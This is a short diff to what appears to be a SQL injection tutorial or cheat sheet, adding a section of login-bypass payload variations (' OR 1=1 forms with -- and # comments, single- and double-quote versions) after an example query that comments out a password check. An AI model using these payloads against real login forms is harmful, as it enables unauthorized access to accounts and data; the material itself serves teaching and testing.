@@ -180,3 +180,11 @@ Additionally if the username is known:
 `SELECT * FROM users WHERE username='admin'--' AND password='anything' LIMIT 1;`
 
 selects the target username as 'admin'
+
+### Variations of payload
+
+`' OR 1=1;--` => classic one, works when username wrapped into single quotes
+
+`' OR 1=1;#` => MySQL alternative
+
+`" OR 1=1--` => for queries that use double quotes around input field
